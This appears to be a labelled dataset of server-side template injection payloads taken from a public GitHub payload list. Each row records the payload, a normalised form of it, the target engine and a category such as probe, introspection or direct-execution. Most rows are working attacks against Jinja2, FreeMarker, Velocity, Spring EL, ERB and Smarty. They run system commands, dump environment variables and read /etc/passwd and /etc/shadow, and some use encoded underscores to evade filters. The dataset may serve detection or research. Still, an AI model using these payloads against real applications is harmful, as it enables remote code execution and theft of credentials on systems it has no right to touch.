{php}echo php_uname();{/php},{php}echophp_uname();{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""uname -a"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{url_for.__globals__['__builtins__']['__import__']('os').popen('env').read()}},{{url_for.__globals__['S']['S']('S').popen('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read()}},{{self._templatereference__context.cycler.__init__.__globals__.os.popen('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.System).getProperty('user.dir')},${t(java.lang.system).getproperty('S')},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}echo getcwd();{/php},{php}echogetcwd();{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""pwd"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= File.read('flag.txt') %>,<%=file.read('S')%>,multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""cat flag.txt"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('ps aux').read()}},{{request.__class__._load_form_data.__globals__.__builtins__.__import__('S').popen('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('ps aux')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{{lipsum|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""ifconfig"")|attr(""read"")()}}","{{lipsum|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('ifconfig')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('netstat -an',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'['S']['S'][N]['S']()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",multi,unknown,1,low,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('netstat -an')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= `netstat -an` %>,<%=`netstat-an`%>,multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}{{7*'7'}}${{7*7}}${7*7}#{7*7},{{N*N}}{{N*'S'}}${{N*N}}${N*N}#{N*N},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}{{self}}{{request}}{{app}}{{_self}},{{config}}{{self}}{{request}}{{app}}{{_self}},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__}}${T(java.lang.System).getenv()}<%= ENV %>,{{lipsum.__globals__}}${t(java.lang.system).getenv()}<%=env%>,multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",""id"").start()}","${""S""?new()(""S"",""S"").start()}",multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"#set($pb=$class.inspect(""java.lang.ProcessBuilder"").type)#set($arr=[""id""])#set($process=$pb.newInstance($arr).start())","#set($pb=$class.inspect(""S"").type)#set($arr=[""S""])#set($process=$pb.newinstance($arr).start())",multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__base__.__subclasses__()}},{{'S'.__class__.__base__.__subclasses__()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Class).forName('java.lang.Runtime')},${t(java.lang.class).forname('S')},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}get_declared_classes();{/php},{php}get_declared_classes();{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.application.__globals__.__builtins__}},{{request.application.__globals__.__builtins__}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime()},${t(java.lang.runtime).getruntime()},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__['__builtins__']}},{{lipsum.__globals__['S']}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${@systemProperties},${@systemproperties},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= defined?(Rails) %>,<%=defined?(rails)%>,multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}defined('SMARTY_VERSION');{/php},{php}defined('S');{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__mro__[1].__subclasses__()[40]}},{{'S'.__class__.__mro__[N].__subclasses__()[N]}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${new java.io.File('/etc/passwd')},${newjava.io.file('S')},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= File.new('/etc/passwd') %>,<%=file.new('S')%>,multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}new SplFileObject('/etc/passwd');{/php},{php}newsplfileobject('S');{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config.__class__}},{{config.__class__}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.String).getClass()},${t(java.lang.string).getclass()},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}get_class($this);{/php},{php}get_class($this);{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{{request.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}","{{request.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()}}",multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{7*7}}[{7*7}],${{N*N}}[{N*N}],multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{<%[7*7]%>}},${{<%[N*N]%>}},multi,unknown,1,low,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${7*7}{{7*7}}<%= 7*7 %>{7*7}#set($x=7*7),${N*N}{{N*N}}<%=N*N%>{N*N}#set($x=N*N),multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}${_self}<%= self %>{$smarty},{{config}}${_self}<%=self%>{$smarty},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${7*7}#set($x=49),{{N*N}}${N*N}#set($x=N),multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__}}${T(java.lang.String)}<%= ''.class %>,{{'S'.__class__}}${t(java.lang.string)}<%='S'.class%>,multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.application}}${applicationScope}<%= defined?(Rails) %>,{{request.application}}${applicationscope}<%=defined?(rails)%>,multi,unknown,1,low,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%},{%forcin[].__class__.__base__.__subclasses__()%}{{c}}{%endfor%},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt,#set($x='S')#set($rt=$x.class.forname('S'))$rt,multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__.os}},{{lipsum.__globals__.os}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.System)},${t(java.lang.system)},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= IO %>,<%=io%>,multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${@environment},${@environment},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}$_SERVER{/php},{php}$_server{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{url_for.__globals__}},{{url_for.__globals__}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{#request}},${{#request}},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= request %>,<%=request%>,multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= Open3.capture2('id') %>,<%=openN.captureN('S')%>,multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{php}exec('id',$output);print_r($output);{/php}","{php}exec('S',$output);print_r($output);{/php}",multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('cat${IFS}/etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= `cat${IFS}/etc/passwd` %>,<%=`cat${ifs}/etc/passwd`%>,multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}},{{cycler|attr('S')|attr('S')}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""cat$IFS/etc/passwd"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}},{{'S'.__class__.__bases__[N].__subclasses__()[N]('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()},${newjava.util.scanner(newjava.io.file('S')).usedelimiter('S').next()},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}readfile('/etc/passwd');{/php},{php}readfile('S');{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""calc"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"#set($runtime=$class.inspect(""java.lang.Runtime"").type)#set($process=$runtime.getRuntime().exec(""calc""))","#set($runtime=$class.inspect(""S"").type)#set($process=$runtime.getruntime().exec(""S""))",multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= `calc` rescue `open /Applications/Calculator.app` %>,<%=`calc`rescue`open/applications/calculator.app`%>,multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}{{7*'7'}}{{config}}{{self}},{{N*N}}{{N*'S'}}{{config}}{{self}},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{7*7}}${7*7}${_self}${app},${{N*N}}${N*N}${_self}${app},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= 7*7 %><%= '7'*7 %><%= self %>,<%=N*N%><%='S'*N%><%=self%>,multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x=7*7)$x,#set($x=N*N)$x,multi,unknown,1,low,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.application.__globals__.__builtins__.__import__('os')}},{{request.application.__globals__.__builtins__.__import__('S')}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime)},${t(java.lang.runtime)},multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= require 'open3' %>,<%=require'S'%>,multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}dl('suhosin.so');{/php},{php}dl('S');{/php},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x=7*'7'),#set($x=N*'S'),java,Velocity,1,high,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($runtime=$class.inspect(""java.lang.Runtime"").type)","#set($runtime=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""id""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""whoami""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cat /etc/passwd""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""ls -la""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""uname -a""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""pwd""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""env""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cat flag.txt""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""ps aux""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""ifconfig""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""netstat -an""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cat /etc/shadow""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($s="""")","#set($s=""S"")",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($stringClass=$s.getClass()),#set($stringclass=$s.getclass()),java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($runtime=$stringClass.forName(""java.lang.Runtime"").getRuntime())","#set($runtime=$stringclass.forname(""S"").getruntime())",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""id""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""whoami""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""cat /etc/passwd""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""ls -la""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""uname -a""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($str=$class.inspect(""java.lang.String"").type)","#set($str=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($chr=$class.inspect(""java.lang.Character"").type)","#set($chr=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($runtime=$str.forName(""java.lang.Runtime""))","#set($runtime=$str.forname(""S""))",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($x=''),#set($x='S'),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($rt=$x.class.forName('java.lang.Runtime')),#set($rt=$x.class.forname('S')),java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($chr=$x.class.forName('java.lang.Character')),#set($chr=$x.class.forname('S')),java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($str=$x.class.forName('java.lang.String')),#set($str=$x.class.forname('S')),java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
